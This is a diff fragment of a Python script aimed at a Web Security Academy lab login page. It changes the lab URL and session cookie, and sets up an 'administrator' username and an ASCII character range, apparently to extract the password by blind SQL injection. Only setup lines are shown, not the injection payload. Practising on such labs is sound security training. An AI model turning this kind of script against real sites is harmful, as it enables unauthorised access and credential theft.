@@ -5,9 +5,9 @@ import requests
 username = "administrator"
 ascii_wordlist = list(range(32, 127))
 
-url = "https://0a0a000804382a678088084a007c00cd.web-security-academy.net:443/login"
+url = "https://0acc007203f821b2800003f900e8003e.web-security-academy.net:443/login"
 headers = {"Accept-Language": "es-ES,es;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Sec-Ch-Ua": "\"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Referer": "https://0a0a000804382a678088084a007c00cd.web-security-academy.net/", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}
-session = "RpAC8zWrjQdpTFOf5TJkITy1a2eVsNbD"
+session = "SHZpmHAPWyN3Xv0hzxCJh3uCHjKBx96l"
 tracking_id = "tzC7M8MYTa1YjdrF"
 
 def make_miskate_if_sql_not_working(query_sql: str) -> str:
